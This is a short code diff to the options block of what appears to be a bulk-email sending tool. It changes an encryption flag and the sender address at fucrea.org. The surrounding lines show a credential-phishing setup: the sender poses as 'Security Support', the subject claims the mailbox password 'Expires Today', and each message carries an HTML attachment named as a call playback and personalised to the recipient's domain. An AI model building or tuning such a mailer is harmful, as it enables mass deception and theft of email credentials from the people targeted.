@@ -116,13 +116,13 @@ const options = {
   concurrencyLimit: 10,
   includeAttachments: false,
   attachmentPath: 'attachment.txt', // Specify the attachment file path here
-  ENABLE_ENCRYPTION: false,
+  ENABLE_ENCRYPTION: true,
   Encode_Attachment: false,
 };
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['support@fucrea.org'];
+const senderAddresses = ['carnecrea@fucrea.org'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "Security Support"; 
 const subjectLineWithPlaceholders = "Reminder: Password Mailbox Expires Today | REFID-{RANDOM_MD5}";
